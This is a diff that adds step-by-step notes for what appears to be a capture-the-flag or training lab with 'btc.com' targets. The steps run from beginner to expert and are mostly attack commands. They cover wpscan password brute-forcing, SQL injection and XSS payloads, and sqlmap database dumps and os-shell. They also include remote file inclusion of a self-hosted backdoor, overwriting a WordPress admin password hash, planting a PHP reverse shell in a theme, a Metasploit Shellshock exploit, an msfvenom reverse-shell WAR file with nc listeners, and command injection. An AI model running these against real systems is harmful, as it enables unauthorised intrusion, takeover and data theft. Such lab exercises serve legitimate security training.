@@ -1,0 +1,242 @@
+beginner:
+
+1. wpscan
+   - wpscan --url url name(without http/https) --enumerate p (to find plugins)
+   - wpscan --url url name(without http/https) --enumerate u (to find usernames)
+   - wpscan --url url name --password '/passwdwordlistlocation/Passwords.txt' --usernames mayank or '/usrnamewordlistlocation/Usernames.txt' (to get usrname and passwd in wp sites) 
+   
+
+2. sslscan
+   - sslscan https://ipaddrorsiteaddress
+
+3. nmap
+   - nmap -A -T5 Ip Addr
+
+4. sqli
+   - netsparker.com to know more
+   - ' or 1=1 --
+
+5. dirbuster
+   - location of wordlist: /usr/share/dirbuster/wordlist
+   - choose medium.txt
+
+6. cross-site scripting
+   - <script>alert("mayank");</script>
+   - softwaretestinghelp.com to know more
+
+Intermediate:
+
+1. SqlMap
+   - edricteo.com to know more
+   - sqlmap -r filepath/file.txt -p search --dbs (to find dbs if the request captured is saved in a .txt file).
+   - sqlmap -r filepath/file.txt -p search -D Dname --tables (to find tables if the request captured is saved in a .txt file).
+   - sqlmap -r filepath/file.txt -p search -D Dname -T Tname --dump (to find table content if the request captured is saved in a .txt file).
+
+
+2. login bypass with sql injection
+   - exploitway.com to know more
+   - exploit-db.com/papers/12975
+
+3. use parameter manipulation
+
+4. use f12 to edit html on web (can change the download file option)
+
+5. hackersthirdeye.com for wpscan 
+
+6. know default wp usernames
+
+7. check for plugings vulnerability.
+
+8. exploit-db.com/exploits/39558  for wordpress plugin site import 1.0.1 LFI and RFI
+
+Proficient:
+
+1. make a split tunnel
+   - sudo openvpn nameofvpn.opvn
+
+2. php reverse shell
+   - go to /usr/share/webshells/php
+
+3. run a http server using python
+   - python -m SimpleHTTPServer 8000(port no)
+
+4. find the tunnel endpoints:
+   - ipaddr sh
+
+5. to run the backdoor file:
+   - www.breakthecode.com/1/btc/?page=http://tunnelpoint:portnohostedusingpython/simple-backdoor.php
+
+6. to run command on web using the above:
+   - www.breakthecode.com/1/btc/?page=http://tunnelpoint:portnohostedusingpython/simple-backdoor.php&cmd=locate+Flag.txt
+   - www.breakthecode.com/1/btc/?page=http://tunnelpoint:portnohostedusingpython/simple-backdoor.php&cmd=cat+/flaglocation/Flag.txt
+
+7. wp plugin cycteme finder 1.3 vuln (to get wp-config.php):
+   - exploit-db.com/exploits/40295
+   - wphome=/var/www/html/wordpress/&&cmd= (add this in the above command given by the site)
+
+8. learn wp
+   - wpbeginner.com/beginners-guide/beginners-guide-to-wordpress-file-and-directory-structure/
+
+9. login admin
+   - ipddr/phpmyadmin/  (post getting the wp-config.php)
+
+10. wordpress password hash generator
+    - www.useotools.com
+
+Note: 
+- create a hash of your own passwd and copy it, once that is done edit the wpadmin password hash on the phpmyadmin and paste your own hash. Once that is done, you can log in using your own password on the wp site.
+- go to appearance and then click on themes (twenty nineteen is vulnerable)
+- paste the php-reverse-shell.php in the editor tab in archive.php. MAKE SHURE YOU PUT YOUR TUNNEL END POINT IP ADDR AND PORT NO OF THE LISTENER.
+- click on upload file.
+
+11. enable listener:
+    - nc -nlvp 1234
+
+
+Note:
+- go to admin.breakthecode.com/wp-content/themes/twentynineteen/archive.php
+
+12. bruteforce using burp
+
+13. SqlMap os shell:
+    - sqlmap --url http://www.luxurytreats2.com/OrderDetails.aspx?ID=ORD-001 -D hotels --os-shell -threads 10
+
+Note: 
+- to find flag in this use the command dir Flag.txt /s /p
+- then use type C:\Windows\system32\Flag.txt
+
+14. for Apache mod_cgi - 'Shellshock' Remote Command Injection:
+    - https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/   (metasploit)
+    - exploit-db.com/exploits/34900
+
+15. use msfconsole
+
+16. type the command 'use exploit/multi/http/apache_mod_cgi_bash_env_exec'
+
+17. type the command 'show target'
+
+18. type the command 'set targeturi http://10.10.1.9/cgi-bin/uploads'
+
+19. type the command 'set rhost 10.10.1.9'
+
+20. type the command 'set lhost your tunnel endpoint'
+
+21. type the command 'exploit'
+
+22. type the command 'shell'
+
+23. wp plugin plainview activity monitor 20161228 (command injection) 
+    - exploit-db.com/exploits/45274
+
+24. click on activity monitor and then go to tools
+
+25. increase the 'maxlength' using inspect element if the input is limited
+
+26. write the commang 'google.com | locate flag.txt' to find the flag
+
+27. use nmap -O -T5 -A ipaddr
+
+28. do searchsploit "made simple"
+
+29.check exploit-db.com/exploits/46546 (CMS Made simple Showtime2 Module 3.6.2 - file upload vuln)
+
+30. locate 46546.py (but this is in python2)for hacking cms
+
+31. bruteforce the admin page using burp
+
+32. convert 46546.py from py2 to py3 using www.pythonconvert.com
+
+33. set up a nc listener for this
+
+34. the showtime2 part is vuln (this tab is there post login(bruteforce))
+
+35. python3 p3_46546.py --url http://cms.btc.com -U administrator -P iloveyou -l tunnelendpoint
+
+36. check for default apache tomcat cred
+
+37.for tomcat do 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=tunnelendpoint LPORT=4444 -f war > shell.war'
+
+38. run nc
+
+40. upload the new war file
+
+41. right click and open on the new tab the new war file after uploading the war file.
+
+Expert:
+
+1. wp plugin responsive thumbnail slider 1.0 vuln:
+   - exploit-db.com/exploits/37998
+
+2. copy php-reverse-shell.php to root dir
+
+3. make changes in the ipaddr variable and save
+
+4. rename php-reverse-shell.php to php-reverse-shell.php.png
+
+5. upload the png file 
+
+6. change the file to php from png using burp
+
+7. go to media.btc.com/wp-content/uploads/wp-responsive-images-thumbnail-slider/
+
+8. start listener
+
+9. click on the file uploaded on the site 
+
+10. use dirbuster for fiyocms:80 to get to the admin page
+
+11. use burp to bruteforce the admin login
+
+12. check for the first change in the lenght while bruteforcing
+
+13. fiyo cms 2.0.6.1 priviledge escalation
+    - exploit-db.com/exploits/41594
+
+14. use burp to change the usergrp
+
+15. change the level to 1 from 3 or 4 using burp
+
+16. turn of foxy and logout and login.
+
+17. upload php-reverse-shell.php
+
+18. enable listener
+
+19. use dirb to go to www.fiyocms.com/media/files/php-reverse-shell.php
+
+20. wp plugin olimometer 2.56 - sqli
+    - exploit-db.com/exploits/40804
+
+21. use sqlmap cmd 'sqlmap -u http:themes.btc.com/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 --dbs --threads=5 --random-agent --no-cast'
+
+22. use sqlmap cmd 'sqlmap -u http:themes.btc.com/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 -D wolfcms --tables --threads=5'
+
+23. use sqlmap cmd 'sqlmap -u http:themes.btc.com/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 -D wolfcms -T user --dump --threads=5' 
+
+24. go to lms.btc.com/?/admin/login for admin login (themes.btc and lms.btc are related)
+
+25. usr name is catchmeifyoucan and use burp to bf the passwd (sniper)
+
+26. manually add the passwd if bf doesnt work
+
+27. upload rev-shell.php
+
+28. enable listener
+
+29. use dirb to find the locn of the uploaded file.
+
+30. use wpscn for pentest.btc
+
+31. wp plugin site editor 1.1.1 LFI (follow this for pentest.btc)
+    - exploit-db.com/exploits/44340
+
+32. use draac.com/chmodchart.html to know more on chmod
+
+33. logs are located in /var/logs/apache2 or auth.log  for apache2
+
+34. do url/var/logs/auth.log&cmd=cat+lacate+Flag.txt
+
+
+
+
+
